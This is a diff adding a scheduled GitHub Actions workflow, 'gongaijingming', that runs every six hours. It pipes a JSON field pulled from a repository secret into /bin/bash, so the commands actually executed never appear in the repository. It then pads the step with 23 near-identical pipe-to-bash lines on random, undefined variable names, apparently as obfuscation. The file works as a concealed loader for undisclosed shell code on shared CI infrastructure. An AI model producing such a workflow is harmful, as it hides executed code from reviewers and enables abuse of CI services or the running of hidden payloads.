@@ -1,0 +1,40 @@
+name: gongaijingming
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongaijingming
+        env:
+          m3: ${{ secrets.m3 }}
+        run: |
+          echo $m3 | jq -r .jsksa044 | /bin/bash
+          echo $pthpb2 | jq -r .zc725 | /bin/bash
+          echo $hxh1 | jq -r .lqfa29937 | /bin/bash
+          echo $ea4 | jq -r .ou386 | /bin/bash
+          echo $uykq94 | jq -r .lepn062 | /bin/bash
+          echo $tho39451 | jq -r .obgw1 | /bin/bash
+          echo $ffz090 | jq -r .saik9646 | /bin/bash
+          echo $yyv353 | jq -r .ldzp0 | /bin/bash
+          echo $h536 | jq -r .kyxgb06671 | /bin/bash
+          echo $p9551 | jq -r .gsmtw7529 | /bin/bash
+          echo $c4558 | jq -r .fmlhr6 | /bin/bash
+          echo $e8838 | jq -r .ynnws66 | /bin/bash
+          echo $umay30914 | jq -r .dcby01 | /bin/bash
+          echo $u0094 | jq -r .k01 | /bin/bash
+          echo $sbs24341 | jq -r .ltl37 | /bin/bash
+          echo $xnft2 | jq -r .r35164 | /bin/bash
+          echo $c64 | jq -r .r446 | /bin/bash
+          echo $er19 | jq -r .enwek9680 | /bin/bash
+          echo $q80 | jq -r .rmn41 | /bin/bash
+          echo $ejnoo3208 | jq -r .swy1 | /bin/bash
+          echo $lmzum37 | jq -r .yqh96 | /bin/bash
+          echo $qtlx95217 | jq -r .n3463 | /bin/bash
+          echo $i08426 | jq -r .bp9 | /bin/bash
+          echo $q91 | jq -r .ngel118 | /bin/bash
+
